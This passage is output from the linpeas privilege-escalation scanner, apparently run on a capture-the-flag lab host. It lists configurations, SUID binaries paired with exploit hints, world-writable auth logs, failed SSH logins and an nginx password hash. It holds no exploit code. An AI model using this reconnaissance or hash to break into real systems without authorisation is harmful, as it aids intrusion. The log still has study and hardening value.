  /etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
  /etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
  ══╣ PHP exec extensions
                                                                                                                                  
  -rw-r--r-- 1 root root 1332 Jul 15  2020 /etc/apache2/sites-available/000-default.conf
  <VirtualHost *:80>
          ServerAdmin webmaster@localhost
          DocumentRoot /var/www/html
          ErrorLog ${APACHE_LOG_DIR}/error.log
          CustomLog ${APACHE_LOG_DIR}/access.log combined
  </VirtualHost>
  lrwxrwxrwx 1 root root 35 Sep  7  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
  <VirtualHost *:80>
          ServerAdmin webmaster@localhost
          DocumentRoot /var/www/html
          ErrorLog ${APACHE_LOG_DIR}/error.log
          CustomLog ${APACHE_LOG_DIR}/access.log combined
  </VirtualHost>

  -rw-r--r-- 1 root root 70999 May 26  2020 /etc/php/7.0/apache2/php.ini
  allow_url_fopen = On
  allow_url_include = Off
  odbc.allow_persistent = On
  ibase.allow_persistent = 1
  mysqli.allow_persistent = On
  pgsql.allow_persistent = On
  -rw-r--r-- 1 root root 70656 May 26  2020 /etc/php/7.0/cli/php.ini
  allow_url_fopen = On
  allow_url_include = Off
  odbc.allow_persistent = On
  ibase.allow_persistent = 1
  mysqli.allow_persistent = On
  pgsql.allow_persistent = On

  -rw-r--r-- 1 root root 401 Feb 11  2017 /etc/init/nginx.conf
  description "nginx - small, powerful, scalable web/proxy server"
  start on filesystem and static-network-up
  stop on runlevel [016]
  expect fork
  respawn
  pre-start script
          [ -x /usr/sbin/nginx ] || { stop; exit 0; }
          /usr/sbin/nginx -q -t -g 'daemon on; master_process on;' || { stop; exit 0; }
  end script
  exec /usr/sbin/nginx -g 'daemon on; master_process on;'
  pre-stop exec /usr/sbin/nginx -s quit
  -rw-r--r-- 1 root root 1462 Feb 11  2017 /etc/nginx/nginx.conf
  user www-data;
  worker_processes auto;
  pid /run/nginx.pid;
  events {
          worker_connections 768;
  }
  http {
          sendfile on;
          tcp_nopush on;
          tcp_nodelay on;
          keepalive_timeout 65;
          types_hash_max_size 2048;
          include /etc/nginx/mime.types;
          default_type application/octet-stream;
          ssl_prefer_server_ciphers on;
          access_log /var/log/nginx/access.log;
          error_log /var/log/nginx/error.log;
          gzip on;
          gzip_disable "msie6";
          include /etc/nginx/conf.d/*.conf;
          include /etc/nginx/sites-enabled/*;
  }


  ╔══════════╣ Analyzing PAM Auth Files (limit 70)
  drwxr-xr-x 2 root root 4096 Sep  7  2020 /etc/pam.d                                                                              
  -rw-r--r-- 1 root root 2133 May 26  2020 /etc/pam.d/sshd
  account    required     pam_nologin.so
  session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
  session    required     pam_loginuid.so
  session    optional     pam_keyinit.so force revoke
  session    optional     pam_motd.so  motd=/run/motd.dynamic
  session    optional     pam_motd.so noupdate
  session    optional     pam_mail.so standard noenv # [1]
  session    required     pam_limits.so
  session    required     pam_env.so # [1]
  session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
  session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


  ╔══════════╣ Analyzing Ldap Files (limit 70)
  The password hash is from the {SSHA} to 'structural'                                                                             
  drwxr-xr-x 2 root root 4096 Sep  7  2020 /etc/ldap


  ╔══════════╣ Analyzing FastCGI Files (limit 70)
  -rw-r--r-- 1 root root 1007 Feb 11  2017 /etc/nginx/fastcgi_params                                                               

  ╔══════════╣ Analyzing Postfix Files (limit 70)
  -rw-r--r-- 1 root root 694 Nov 10  2015 /usr/share/bash-completion/completions/postfix                                           


  ╔══════════╣ Analyzing Htpasswd Files (limit 70)
  -rw-r--r-- 1 root root 44 Sep  7  2020 /etc/nginx/.htpasswd                                                                      
  nginx:$apr1$azDw/Iwv$E7rIlqjeiX9Sx9.sMCcAZ0

  ╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                  


  -rw-r--r-- 1 root root 69 May 26  2020 /etc/php/7.0/mods-available/ftp.ini






  ╔══════════╣ Analyzing Interesting logs Files (limit 70)
  -rw-r----- 1 www-data adm 1175 Nov 22 06:35 /var/log/nginx/access.log                                                            

  -rw-r----- 1 www-data adm 1024 Nov 22 06:35 /var/log/nginx/error.log

  ╔══════════╣ Analyzing Other Interesting Files (limit 70)
  -rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc                                                                       
  -rw-r--r-- 1 tomato tomato 3771 Sep  7  2020 /home/tomato/.bashrc





  -rw-r--r-- 1 root root 675 Aug 31  2015 /etc/skel/.profile
  -rw-r--r-- 1 tomato tomato 675 Sep  7  2020 /home/tomato/.profile



  -rw-r--r-- 1 tomato tomato 0 Sep  7  2020 /home/tomato/.sudo_as_admin_successful



  MySQL process not found.
  ╔══════════╣ Analyzing PGP-GPG Files (limit 70)
  /usr/bin/gpg                                                                                                                     
  gpg Not Found
  netpgpkeys Not Found                                                                                                             
  netpgp Not Found                                                                                                                 
                                                                                                                                  
  -rw-r--r-- 1 root root 12255 Apr 20  2016 /etc/apt/trusted.gpg
  -rw-r--r-- 1 root root 12335 Apr 20  2016 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg



  ╔══════════╣ Searching uncommon passwd files (splunk)
  passwd file: /etc/pam.d/passwd                                                                                                   
  passwd file: /etc/passwd

  ╔══════════╣ Searching ssl/ssh files
  ╔══════════╣ Analyzing SSH Files (limit 70)                                                                                      
                                                                                                                                  




  -rw-r--r-- 1 root root 601 Sep  7  2020 /etc/ssh/ssh_host_dsa_key.pub
  -rw-r--r-- 1 root root 173 Sep  7  2020 /etc/ssh/ssh_host_ecdsa_key.pub
  -rw-r--r-- 1 root root 93 Sep  7  2020 /etc/ssh/ssh_host_ed25519_key.pub
  -rw-r--r-- 1 root root 393 Sep  7  2020 /etc/ssh/ssh_host_rsa_key.pub

  Port 2211
  PermitRootLogin prohibit-password
  PubkeyAuthentication yes
  PermitEmptyPasswords no
  ChallengeResponseAuthentication no
  UsePAM yes
  ══╣ Some certificates were found (out limited):
  /etc/ssl/certs/ACCVRAIZ1.pem                                                                                                     
  /etc/ssl/certs/ACEDICOM_Root.pem
  116112PSTORAGE_CERTSBIN

  ══╣ /etc/hosts.allow file found, trying to read the rules:
  /etc/hosts.allow                                                                                                                 


  Searching inside /etc/ssh/ssh_config for interesting info
  Host *
      SendEnv LANG LC_*
      HashKnownHosts yes
      GSSAPIAuthentication yes
      GSSAPIDelegateCredentials no




                        ╔════════════════════════════════════╗
  ══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                               
                        ╚════════════════════════════════════╝                                                                     
  ╔══════════╣ SUID - Check easy privesc, exploits and write perms
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                  
  -rwsr-xr-x 1 root root 139K Feb 17  2016 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)                                                                                                                             
  -rwsr-xr-x 1 root root 40K Mar 29  2016 /bin/su
  -rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
  -rwsr-xr-x 1 root root 31K Mar 11  2016 /bin/fusermount
  -rwsr-xr-x 1 root root 40K Apr 13  2016 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
  -rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
  -rwsr-xr-x 1 root root 27K Apr 13  2016 /bin/umount  --->  BSD/Linux(08-1996)
  -rwsr-xr-x 1 root root 419K May 26  2020 /usr/lib/openssh/ssh-keysign
  -rwsr-xr-x 1 root root 10K Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
  -rwsr-xr-- 1 root messagebus 42K Apr  1  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  -rwsr-xr-x 1 root root 40K Mar 29  2016 /usr/bin/chsh
  -rwsr-xr-x 1 root root 134K Mar 30  2016 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
  -rwsr-xr-x 1 root root 74K Mar 29  2016 /usr/bin/gpasswd
  -rwsr-xr-x 1 root root 39K Mar 29  2016 /usr/bin/newgrp  --->  HP-UX_10.20
  -rwsr-xr-x 1 root root 53K Mar 29  2016 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                            
  -rwsr-xr-x 1 root root 49K Mar 29  2016 /usr/bin/chfn  --->  SuSE_9.3/10
  -rwsr-xr-x 1 root root 11K May  8  2018 /usr/bin/vmware-user-suid-wrapper

  ╔══════════╣ SGID
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                  
  -rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab                                                                      
  -rwxr-sr-x 1 root mlocate 39K Nov 17  2014 /usr/bin/mlocate
  -rwxr-sr-x 1 root tty 27K Apr 13  2016 /usr/bin/wall
  -rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write
  -rwxr-sr-x 1 root shadow 61K Mar 29  2016 /usr/bin/chage
  -rwxr-sr-x 1 root shadow 23K Mar 29  2016 /usr/bin/expiry
  -rwxr-sr-x 1 root ssh 351K May 26  2020 /usr/bin/ssh-agent
  -rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/unix_chkpwd
  -rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/pam_extrausers_chkpwd

  ╔══════════╣ Files with ACLs (limited to 50)
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                           
  files with acls in searched folders Not Found                                                                                    
                                                                                                                                  
  ╔══════════╣ Capabilities
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                   
  ══╣ Current shell capabilities                                                                                                   
  ./linpeas.sh: 7794: ./linpeas.sh: [[: not found                                                                                  
  CapInh:  [Invalid capability format]
  ./linpeas.sh: 7794: ./linpeas.sh: [[: not found
  CapPrm:  [Invalid capability format]
  ./linpeas.sh: 7785: ./linpeas.sh: [[: not found
  CapEff:  [Invalid capability format]
  ./linpeas.sh: 7794: ./linpeas.sh: [[: not found
  CapBnd:  [Invalid capability format]
  ./linpeas.sh: 7794: ./linpeas.sh: [[: not found
  CapAmb:  [Invalid capability format]

  ╚ Parent process capabilities
  ./linpeas.sh: 7819: ./linpeas.sh: [[: not found                                                                                  
  CapInh:  [Invalid capability format]
  ./linpeas.sh: 7819: ./linpeas.sh: [[: not found
  CapPrm:  [Invalid capability format]
  ./linpeas.sh: 7810: ./linpeas.sh: [[: not found
  CapEff:  [Invalid capability format]
  ./linpeas.sh: 7819: ./linpeas.sh: [[: not found
  CapBnd:  [Invalid capability format]
  ./linpeas.sh: 7819: ./linpeas.sh: [[: not found
  CapAmb:  [Invalid capability format]


  Files with capabilities (limited to 50):
  /usr/bin/mtr = cap_net_raw+ep
  /usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
  /usr/bin/traceroute6.iputils = cap_net_raw+ep

  ╔══════════╣ Checking misconfigurations of ld.so
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                           
  /etc/ld.so.conf                                                                                                                  
  Content of /etc/ld.so.conf:                                                                                                      
  include /etc/ld.so.conf.d/*.conf

  /etc/ld.so.conf.d
    /etc/ld.so.conf.d/libc.conf                                                                                                    
    - /usr/local/lib                                                                                                               
    /etc/ld.so.conf.d/x86_64-linux-gnu.conf
    - /lib/x86_64-linux-gnu                                                                                                        
    - /usr/lib/x86_64-linux-gnu
    /etc/ld.so.conf.d/x86_64-linux-gnu_EGL.conf
    - /usr/lib/x86_64-linux-gnu/mesa-egl                                                                                           

  /etc/ld.so.preload
  ╔══════════╣ Files (scripts) in /etc/profile.d/                                                                                  
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                 
  total 16                                                                                                                         
  drwxr-xr-x  2 root root 4096 Sep  7  2020 .
  drwxr-xr-x 89 root root 4096 Nov  4  2023 ..
  -rw-r--r--  1 root root  663 Nov 10  2015 bash_completion.sh
  -rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

  ╔══════════╣ Permissions in init, init.d, systemd, and rc.d
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                     
                                                                                                                                  
  ╔══════════╣ AppArmor binary profiles
  -rw-r--r-- 1 root root 3310 Apr 12  2016 sbin.dhclient                                                                           
  -rw-r--r-- 1 root root 1527 Jan  5  2016 usr.sbin.rsyslogd
  -rw-r--r-- 1 root root 1454 Jun  2  2015 usr.sbin.tcpdump

  ═╣ Hashes inside passwd file? ........... No
  ═╣ Writable passwd file? ................ No                                                                                     
  ═╣ Credentials in fstab/mtab? ........... No                                                                                     
  ═╣ Can I read shadow files? ............. No                                                                                     
  ═╣ Can I read shadow plists? ............ No                                                                                     
  ═╣ Can I write shadow plists? ........... No                                                                                     
  ═╣ Can I read opasswd file? ............. No                                                                                     
  ═╣ Can I write in network-scripts? ...... No                                                                                     
  ═╣ Can I read root folder? .............. No                                                                                     
                                                                                                                                  
  ╔══════════╣ Searching root files in home dirs (limit 30)
  /home/                                                                                                                           
  /root/
  /var/www
  /var/www/html
  /var/www/html/img.jpeg
  /var/www/html/index.nginx-debian.html
  /var/www/html/antibot_image
  /var/www/html/antibot_image/antibots
  /var/www/html/antibot_image/antibots/screenshot-3.jpg
  /var/www/html/antibot_image/antibots/dashboard
  /var/www/html/antibot_image/antibots/dashboard/botsgraph_pie2.php
  /var/www/html/antibot_image/antibots/dashboard/calcula_stats.php
  /var/www/html/antibot_image/antibots/dashboard/calcula_stats_pie2.php
  /var/www/html/antibot_image/antibots/dashboard/topips_24.php
  /var/www/html/antibot_image/antibots/dashboard/botsgraph.php
  /var/www/html/antibot_image/antibots/dashboard/dashboard.php
  /var/www/html/antibot_image/antibots/dashboard/botsgraph_24.php
  /var/www/html/antibot_image/antibots/dashboard/main.php
  /var/www/html/antibot_image/antibots/dashboard/attacksgraph.php
  /var/www/html/antibot_image/antibots/dashboard/css
  /var/www/html/antibot_image/antibots/dashboard/css/help.css
  /var/www/html/antibot_image/antibots/dashboard/calcula_stats_24.php
  /var/www/html/antibot_image/antibots/dashboard/topips.php
  /var/www/html/antibot_image/antibots/language
  /var/www/html/antibot_image/antibots/language/antibots-en.po
  /var/www/html/antibot_image/antibots/language/antibots-en.mo
  /var/www/html/antibot_image/antibots/assets
  /var/www/html/antibot_image/antibots/assets/php
  /var/www/html/antibot_image/antibots/assets/php/content_antibots.php
  /var/www/html/antibot_image/antibots/assets/images

  ╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                                  
  ╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                  
  ╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                 
  /dev/mqueue                                                                                                                      
  /dev/shm
  /run/lock
  /run/lock/apache2
  /tmp
  /tmp/.ICE-unix
  /tmp/.Test-unix
  /tmp/.X11-unix
  /tmp/.XIM-unix
  /tmp/.font-unix
  #)You_can_write_even_more_files_inside_last_directory

  /tmp/test-pedro/linpeas.sh
  /tmp/test/linpeas.sh
  /var/cache/apache2/mod_cache_disk
  /var/lib/nginx/body
  /var/lib/nginx/fastcgi
  /var/lib/nginx/proxy
  /var/lib/nginx/scgi
  /var/lib/nginx/uwsgi
  /var/lib/php/sessions
  /var/log/auth.log
  /var/log/auth.log.1
  /var/log/nginx/access.log
  /var/log/nginx/access.log.1
  /var/log/nginx/access.log.2.gz
  /var/log/nginx/error.log
  /var/log/nginx/error.log.1
  #)You_can_write_even_more_files_inside_last_directory

  /var/tmp

  ╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                 
                                                                                                                                  


                              ╔═════════════════════════╗
  ════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                              
                              ╚═════════════════════════╝                                                                          
  ╔══════════╣ .sh files in path
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                         
  /usr/bin/gettext.sh                                                                                                              
  /bin/auth.sh

  ╔══════════╣ Executable files potentially added by user (limit 70)
  2025-11-22+06:57:32.0148103590 /var/log/auth.log                                                                                 
  2025-11-16+06:25:01.1181362360 /var/log/auth.log.1
  2020-09-07+02:35:01.5094984680 /bin/auth.sh

  ╔══════════╣ Unexpected in root
  /initrd.img                                                                                                                      
  /vmlinuz

  ╔══════════╣ Modified interesting files in the last 5mins (limit 100)
  /var/log/auth.log                                                                                                                
  /var/log/syslog

  logrotate 3.8.7
  ╔══════════╣ Syslog configuration (limit 50)
                                                                                                                                  


  module(load="imuxsock") # provides support for local system logging
  module(load="imklog")   # provides kernel logging support



  $KLogPermitNonKernelFacility on


  $ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat

  $RepeatedMsgReduction on

  $FileOwner syslog
  $FileGroup adm
  $FileCreateMode 0640
  $DirCreateMode 0755
  $Umask 0022
  $PrivDropToUser syslog
  $PrivDropToGroup syslog

  $WorkDirectory /var/spool/rsyslog

  $IncludeConfig /etc/rsyslog.d/*.conf

  ╔══════════╣ Auditd configuration (limit 50)
  auditd configuration Not Found                                                                                                   
  ╔══════════╣ Log files with potentially weak perms (limit 50)                                                                    
    2629333      4 -rw-r-----   1 syslog   adm          3618 Nov 18 06:25 /var/log/syslog.5.gz                                     
    2629103    168 -rw-r-----   1 syslog   adm        169516 Nov 22 06:29 /var/log/kern.log
    2629341      4 -rw-r-----   1 www-data adm          1024 Nov 22 06:35 /var/log/nginx/error.log
    2629340    280 -rw-r-----   1 www-data adm        283485 Nov 15 19:02 /var/log/nginx/access.log.2.gz
    2623427   4644 -rw-r-----   1 www-data adm       4755354 Nov 22 06:22 /var/log/nginx/access.log.1
    2628778   1572 -rw-r-----   1 www-data adm       1606470 Nov 15 19:02 /var/log/nginx/error.log.2.gz
    2628779      4 -rw-r-----   1 www-data adm          1175 Nov 22 06:35 /var/log/nginx/access.log
    2623429   5096 -rw-r-----   1 www-data adm       5217064 Nov 22 06:22 /var/log/nginx/error.log.1
    2621461    120 -rw-r-----   1 root     adm        118020 Sep  7  2020 /var/log/apt/term.log
    2622667  16012 -rwxrwxrwx   1 syslog   adm      16389544 Nov 16 06:25 /var/log/auth.log.1
    2623487     40 -rw-r-----   1 syslog   adm         34603 Nov 22 06:25 /var/log/syslog.1
    2629327    360 -rw-r-----   1 syslog   adm        365746 Nov 16 06:25 /var/log/syslog.7.gz
    2629342      4 -rw-r-----   1 syslog   adm          3703 Nov 21 06:25 /var/log/syslog.2.gz
    2629337     32 -rw-r-----   1 syslog   adm         29150 Nov 20 06:25 /var/log/syslog.3.gz
    2622440      4 -rw-r-----   1 root     adm            31 Apr 20  2016 /var/log/dmesg
    2629335      4 -rw-r-----   1 syslog   adm          3692 Nov 19 06:25 /var/log/syslog.4.gz
    2629330      4 -rw-r-----   1 syslog   adm          3806 Nov 17 06:25 /var/log/syslog.6.gz
    2629278    772 -rw-r-----   1 root     adm        785832 Nov 22 05:49 /var/log/vsftpd.log
    2629277   2232 -rwxrwxrwx   1 syslog   adm       2281284 Nov 22 06:57 /var/log/auth.log
    2622444      4 -rw-r-----   1 root     adm            31 Apr 20  2016 /var/log/fsck/checkfs
    2622445      4 -rw-r-----   1 root     adm            31 Apr 20  2016 /var/log/fsck/checkroot
    2627412      4 -rw-r-----   1 syslog   adm          1124 Nov 22 06:57 /var/log/syslog
    2623489   2172 -rw-r-----   1 syslog   adm       2223993 Nov 15 18:22 /var/log/kern.log.1

  ╔══════════╣ Files inside /home/www-data (limit 20)
                                                                                                                                  
  ╔══════════╣ Files inside others home (limit 20)
  /home/tomato/.bashrc                                                                                                             
  /home/tomato/.wget-hsts
  /home/tomato/.sudo_as_admin_successful
  /home/tomato/.bash_history
  /home/tomato/.bash_logout
  /home/tomato/.profile
  /var/www/html/img.jpeg
  /var/www/html/index.nginx-debian.html
  /var/www/html/antibot_image/antibots/screenshot-3.jpg
  /var/www/html/antibot_image/antibots/dashboard/botsgraph_pie2.php
  /var/www/html/antibot_image/antibots/dashboard/calcula_stats.php
  /var/www/html/antibot_image/antibots/dashboard/calcula_stats_pie2.php
  /var/www/html/antibot_image/antibots/dashboard/topips_24.php
  /var/www/html/antibot_image/antibots/dashboard/botsgraph.php
  /var/www/html/antibot_image/antibots/dashboard/dashboard.php
  /var/www/html/antibot_image/antibots/dashboard/botsgraph_24.php
  /var/www/html/antibot_image/antibots/dashboard/main.php
  /var/www/html/antibot_image/antibots/dashboard/attacksgraph.php
  /var/www/html/antibot_image/antibots/dashboard/css/help.css
  /var/www/html/antibot_image/antibots/dashboard/calcula_stats_24.php
  grep: write error: Broken pipe

  ╔══════════╣ Searching installed mail applications
                                                                                                                                  
  ╔══════════╣ Mails (limit 50)
                                                                                                                                  
  ╔══════════╣ Backup folders
  drwxr-xr-x 2 root root 4096 Nov 15 06:25 /var/backups                                                                            
  total 620
  -rw-r--r-- 1 root root    40960 Nov 15 06:25 alternatives.tar.0
  -rw-r--r-- 1 root root    16704 Sep  7  2020 apt.extended_states.0
  -rw-r--r-- 1 root root       11 Sep  7  2020 dpkg.arch.0
  -rw-r--r-- 1 root root      462 Sep  7  2020 dpkg.diversions.0
  -rw-r--r-- 1 root root      207 Sep  7  2020 dpkg.statoverride.0
  -rw-r--r-- 1 root root   541935 Sep  7  2020 dpkg.status.0
  -rw------- 1 root root      801 Sep  7  2020 group.bak
  -rw------- 1 root shadow    674 Sep  7  2020 gshadow.bak
  -rw------- 1 root root     1517 Sep  7  2020 passwd.bak
  -rw------- 1 root shadow   1012 Nov  4  2023 shadow.bak


  ╔══════════╣ Backup files (limited 100)
  -rw-r--r-- 1 root root 8694 Apr 18  2016 /lib/modules/4.4.0-21-generic/kernel/drivers/net/team/team_mode_activebackup.ko         
  -rw-r--r-- 1 root root 8974 Apr 18  2016 /lib/modules/4.4.0-21-generic/kernel/drivers/power/wm831x_backup.ko
  -rw-r--r-- 1 root root 3126 Sep  7  2020 /etc/apt/sources.bak
  -rw-r--r-- 1 root root 610 Sep  7  2020 /etc/xml/catalog.old
  -rw-r--r-- 1 root root 673 Sep  7  2020 /etc/xml/xml-core.xml.old
  -rw-r--r-- 1 root root 10464 Sep  7  2020 /usr/share/info/dir.old
  -rw-r--r-- 1 root root 2308 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-where.page
  -rw-r--r-- 1 root root 2530 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-what.page
  -rw-r--r-- 1 root root 1732 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-check.page
  -rw-r--r-- 1 root root 1298 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-why.page
  -rw-r--r-- 1 root root 2418 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-how.page
  -rw-r--r-- 1 root root 1427 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-restore.page
  -rw-r--r-- 1 root root 3094 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-thinkabout.page
  -rw-r--r-- 1 root root 2034 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-frequency.page
  -rw-r--r-- 1 root root 974 Apr  7  2016 /usr/share/help-langpack/en_AU/deja-dup/backup-auto.page
  -rw-r--r-- 1 root root 755 Apr  7  2016 /usr/share/help-langpack/en_AU/deja-dup/backup-first.page
  -rw-r--r-- 1 root root 2295 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-where.page
  -rw-r--r-- 1 root root 2500 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-what.page
  -rw-r--r-- 1 root root 1720 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-check.page
  -rw-r--r-- 1 root root 1291 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-why.page
  -rw-r--r-- 1 root root 2392 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-how.page
  -rw-r--r-- 1 root root 1422 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-restore.page
  -rw-r--r-- 1 root root 3073 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-thinkabout.page
  -rw-r--r-- 1 root root 2018 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-frequency.page
  -rw-r--r-- 1 root root 974 Apr  7  2016 /usr/share/help-langpack/en_GB/deja-dup/backup-auto.page
  -rw-r--r-- 1 root root 755 Apr  7  2016 /usr/share/help-langpack/en_GB/deja-dup/backup-first.page
  -rw-r--r-- 1 root root 2543 Jun 24  2016 /usr/share/help-langpack/en_GB/evolution/backup-restore.page
  -rw-r--r-- 1 root root 2289 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-where.page
  -rw-r--r-- 1 root root 2503 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-what.page
  -rw-r--r-- 1 root root 1720 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-check.page
  -rw-r--r-- 1 root root 1291 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-why.page
  -rw-r--r-- 1 root root 2371 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-how.page
  -rw-r--r-- 1 root root 1420 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-restore.page
  -rw-r--r-- 1 root root 3067 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-thinkabout.page
  -rw-r--r-- 1 root root 2020 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-frequency.page
  -rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
  -rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
  -rw-r--r-- 1 root root 35792 May  8  2018 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
  -rw-r--r-- 1 root root 189423 Apr 18  2016 /usr/src/linux-headers-4.4.0-21-generic/.config.old
  -rw-r--r-- 1 root root 0 Apr 18  2016 /usr/src/linux-headers-4.4.0-21-generic/include/config/wm831x/backup.h
  -rw-r--r-- 1 root root 0 Apr 18  2016 /usr/src/linux-headers-4.4.0-21-generic/include/config/net/team/mode/activebackup.h
  -rw-r--r-- 1 root root 128 Sep  7  2020 /var/lib/sgml-base/supercatalog.old

  ╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
  Found /var/lib/mlocate/mlocate.db: regular file, no read permission                                                              


  ╔══════════╣ Web files?(output limit)
  /var/www/:                                                                                                                       
  total 12K
  drwxr-xr-x  3 root root 4.0K Sep  7  2020 .
  drwxr-xr-x 12 root root 4.0K Sep  7  2020 ..
  drwxr-xr-x  3 root root 4.0K Sep  7  2020 html

  /var/www/html:
  total 80K
  drwxr-xr-x 3 root root 4.0K Sep  7  2020 .
  drwxr-xr-x 3 root root 4.0K Sep  7  2020 ..

  ╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
  -rw------- 1 root root 0 Apr 20  2016 /etc/.pwd.lock                                                                             
  -rw-r--r-- 1 root root 220 Aug 31  2015 /etc/skel/.bash_logout
  -rw-r--r-- 1 root root 1376 Sep  7  2020 /etc/apparmor.d/cache/.features
  -rw-r--r-- 1 root root 0 Nov 20 02:00 /run/network/.ifstate.lock
  -rw-rw-r-- 1 tomato tomato 175 Sep  7  2020 /home/tomato/.wget-hsts
  -rw-r--r-- 1 tomato tomato 220 Sep  7  2020 /home/tomato/.bash_logout

  ╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                                             
  -rwxr-xr-x 1 www-data www-data 971926 Nov 22 04:47 /tmp/test-pedro/linpeas.sh                                                    
  -rw-r--r-- 1 www-data www-data 971926 Nov 15 07:04 /tmp/test/linpeas.sh
  -rw-r--r-- 1 root root 11 Sep  7  2020 /var/backups/dpkg.arch.0
  -rw-r--r-- 1 root root 40960 Nov 15 06:25 /var/backups/alternatives.tar.0

  ╔══════════╣ Searching passwords in history files
                                                                                                                                  
  ╔══════════╣ Searching *password* or *credential* files in home (limit 70)
  /bin/systemd-ask-password                                                                                                        
  /bin/systemd-tty-ask-password-agent
  /etc/pam.d/common-password
  /var/cache/debconf/passwords.dat
  /var/lib/pam/password

  ╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                  
  ╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                  
  ╔══════════╣ Searching passwords inside logs (limit 70)
  grep: /var/log/auth.log.1:Nov 15 06:06:10 ubuntu sshd[973]: Failed password for invalid user shell from 10.0.1.14 port 35102 ssh2
  /var/log/auth.log.1:Nov 15 06:10:08 ubuntu sshd[1022]: Failed password for invalid user shell from 10.0.1.14 port 33182 ssh2
  /var/log/auth.log.1:Nov 15 06:10:12 ubuntu sshd[1022]: Failed password for invalid user shell from 10.0.1.14 port 33182 ssh2
  /var/log/auth.log.1:Nov 15 06:19:24 ubuntu sshd[1226]: Failed password for invalid user shell from 10.0.1.14 port 54882 ssh2
